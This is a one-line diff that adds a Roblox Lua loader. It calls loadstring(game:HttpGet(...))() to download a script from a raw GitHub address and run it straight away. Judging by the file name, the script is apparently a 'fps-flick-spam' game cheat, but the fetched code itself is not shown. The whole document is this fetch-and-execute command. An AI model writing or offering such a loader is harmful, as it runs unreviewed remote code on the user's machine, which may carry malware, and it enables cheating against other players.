@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/fps-flick-spam0-pi6vavn4n5aq5k.lua"))()
